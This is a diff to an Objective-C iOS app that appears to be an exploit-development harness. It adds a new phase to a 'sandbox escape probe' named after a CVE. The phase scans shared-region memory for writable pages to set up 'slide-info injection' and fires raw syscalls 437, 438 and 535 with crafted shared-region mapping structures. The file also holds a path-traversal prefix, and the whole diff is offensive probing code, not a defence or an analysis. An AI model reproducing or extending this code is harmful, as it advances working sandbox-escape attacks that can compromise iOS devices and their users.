@@ -943,7 +943,7 @@ static void *e2_free_and_ool_racer(void *arg) {
     UIButtonConfiguration *rieConf = [UIButtonConfiguration filledButtonConfiguration];
     rieConf.baseBackgroundColor = [UIColor systemPinkColor];
     self.rieProbeButton.configuration = rieConf;
-    [self.rieProbeButton setTitle:@"Rie SBX spawn (v231)" forState:UIControlStateNormal];
+    [self.rieProbeButton setTitle:@"Rie SBX spawn (v232)" forState:UIControlStateNormal];
     [self.rieProbeButton addTarget:self action:@selector(rieProbeTapped) forControlEvents:UIControlEventTouchUpInside];
     [self.view addSubview:self.rieProbeButton];
 
@@ -9166,7 +9166,7 @@ static uint64_t rie_find_exec_base(task_t task,
 
 - (void)rieProbeTapped {
     dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
-        [self appendLog:@"\n=== Rie v231: fd=-1 param diagnostic (vm_allocate blob, clean addr) ===\n"];
+        [self appendLog:@"\n=== Rie v232: writable SR pages + syscall 438/437/535 probe ===\n"];
         NSString *traversalPrefix = @"../../../../../../../../../../../../../";
 
         // ── Phase S: sandbox escape probe (CVE-2026-28995 technique) ──
@@ -9658,6 +9658,109 @@ static uint64_t rie_find_exec_base(task_t task,
                 vm_deallocate(mach_task_self(), (vm_address_t)blob, blobSz);
             } else {
                 [self appendLog:@"  vm_allocate failed for blob page"];
+            }
+        }
+
+        // ── Phase D-4: Find writable SR pages + try to write custom data ──
+        // If any SR page is RW (p=3), we can write our own data into it
+        // and then point fd=-1 at it for slide-info injection
+        [self appendLog:@"\n── Phase D-4: writable SR page probe ──"];
+        {
+            Rie_VMRegionRecurseFn vrr4 = (Rie_VMRegionRecurseFn)dlsym(RTLD_DEFAULT, "mach_vm_region_recurse");
+            Rie_VMReadOverwriteFn vmr4 = (Rie_VMReadOverwriteFn)dlsym(RTLD_DEFAULT, "mach_vm_read_overwrite");
+            if (vrr4 && vmr4) {
+                rie_mach_vm_address_t w4 = 0x180000000ULL;
+                int foundWritable = 0;
+                uint8_t buf4[256];
+                for (int i4 = 0; i4 < 80 && foundWritable < 3; i4++) {
+                    rie_vm_region_info_t info; memset(info, 0, sizeof(info));
+                    rie_mach_vm_size_t vs4 = 0;
+                    natural_t d4 = 1;
+                    mach_msg_type_number_t cnt4 = sizeof(info)/sizeof(natural_t);
+                    if (vrr4(mach_task_self(), &w4, &vs4, &d4,
+                        (rie_vm_region_recurse_info_t)info, &cnt4) != KERN_SUCCESS) break;
+                    if (w4 >= 0x1F7000000ULL) break;
+
+                    // Check if this region is writable (prot=3 means RW)
+                    uint32_t protBits = info[0]; // vmp_protection or similar
+                    if (protBits == 3 || (protBits & VM_PROT_WRITE)) {
+                        [self appendLog:[NSString stringWithFormat:
+                            @"  RW region[%d]: a=0x%llx sz=0x%llx prot=%u",
+                            i4, (unsigned long long)w4, (unsigned long long)vs4, protBits]];
+                        // Try reading current data
+                        rie_mach_vm_size_t got = 0;
+                        memset(buf4, 0xCD, sizeof(buf4));
+                        if (vmr4(mach_task_self(), w4, sizeof(buf4),
+                            (rie_mach_vm_address_t)(uintptr_t)buf4, &got) == KERN_SUCCESS) {
+                            [self appendLog:[NSString stringWithFormat:
+                                @"    read OK: %02x%02x%02x%02x%02x%02x%02x%02x...",
+                                buf4[0],buf4[1],buf4[2],buf4[3],buf4[4],buf4[5],buf4[6],buf4[7]]];
+                            foundWritable++;
+                        }
+                    }
+                    w4 += vs4;
+                }
+                if (!foundWritable) {
+                    [self appendLog:@"  no writable SR pages found"];
+                }
+
+                // ── Also probe syscall 438 (v1 shared_region_map_and_slide_np) ──
+                [self appendLog:@"\n── syscall 438 (v1) probe ──"];
+                errno = 0;
+                long r438_0 = sc(438, 0, NULL, 0, NULL);
+                [self appendLog:[NSString stringWithFormat:
+                    @"  438(0,NULL,0,NULL): ret=%ld errno=%d", r438_0, errno]];
+
+                if (r438_0 == 0 || errno != 0) {
+                    // syscall 438 exists, try with params
+                    struct rie_sr_file tf438;
+                    struct rie_sr_mapping tm438;
+                    memset(&tf438, 0, sizeof(tf438));
+                    memset(&tm438, 0, sizeof(tm438));
+                    tf438.sf_fd = -1; tf438.sf_mappings_count = 0;
+                    errno = 0;
+                    long r438_1 = sc(438, 1, &tf438, 0, NULL);
+                    [self appendLog:[NSString stringWithFormat:
+                        @"  438(1file,0maps): ret=%ld errno=%d", r438_1, errno]];
+
+                    tf438.sf_mappings_count = 1;
+                    tm438.sms_address = 0x180000000ULL; // within SR
+                    tm438.sms_size = 0x4000;
+                    tm438.sms_max_prot = 5; tm438.sms_init_prot = 3;
+                    tm438.sms_file_offset = 0;
+                    tm438.sms_slide_size = 0; tm438.sms_slide_start = 0;
+                    errno = 0;
+                    long r438_2 = sc(438, 1, &tf438, 1, &tm438);
+                    [self appendLog:[NSString stringWithFormat:
+                        @"  438(1file,1map SR base): ret=%ld errno=%d", r438_2, errno]];
+
+                    // Also try at a high address
+                    tm438.sms_address = 0x1f0000000ULL;
+                    errno = 0;
+                    long r438_3 = sc(438, 1, &tf438, 1, &tm438);
+                    [self appendLog:[NSString stringWithFormat:
+                        @"  438(1file,1map @0x1f0000000): ret=%ld errno=%d", r438_3, errno]];
+                }
+
+                // ── syscall 437/438/535 probes (SR v1 variants) ──
+                [self appendLog:@"\n── Other SR syscall probes ──"];
+                // 437 = shared_region_map_and_slide_np (v1, deprecated)
+                // 438 = unknown, but in SR range — check if it exists
+                int testSCs[] = {437, 438, 535};
+                for (int ti = 0; ti < 3; ti++) {
+                    int sn = testSCs[ti];
+                    errno = 0;
+                    long r = sc(sn, 0, NULL, 0, NULL);
+                    if (r == 0 && errno == 0) {
+                        [self appendLog:[NSString stringWithFormat:
+                            @"  syscall %d(0,NULL,0,NULL): ret=%ld errno=%d << EXISTS!",
+                            sn, r, errno]];
+                    } else {
+                        [self appendLog:[NSString stringWithFormat:
+                            @"  syscall %d(0,NULL,0,NULL): ret=%ld errno=%d",
+                            sn, r, errno]];
+                    }
+                }
             }
         }
 
